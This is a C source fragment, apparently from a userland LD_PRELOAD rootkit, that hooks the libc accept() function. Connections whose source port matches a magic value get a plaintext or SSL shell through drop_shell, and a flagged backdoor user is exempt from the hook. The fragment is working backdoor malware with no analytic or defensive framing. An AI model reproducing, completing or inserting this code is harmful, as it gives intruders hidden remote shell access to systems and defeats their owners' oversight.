int hijack_accept(int sockfd, struct sockaddr *addr){
    struct sockaddr_in *sa_i = (struct sockaddr_in *)addr;
    if(!sa_i || not_user(0)) return sockfd;

    if(htons(sa_i->sin_port) == ACCEPT_PORT) return drop_shell(METHOD_PLAINTEXT, sockfd);

    #ifdef ACCEPT_USE_SSL
    if(htons(sa_i->sin_port) == SSL_ACCEPT_PORT) return drop_shell(METHOD_SSL, sockfd);
    #endif

    return sockfd;
}

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    hook(CACCEPT);
    if(is_bdusr()) return (long)call(CACCEPT, sockfd, addr, addrlen);

    int sock = (long)call(CACCEPT, sockfd, addr, addrlen);
    return hijack_accept(sock, addr);
}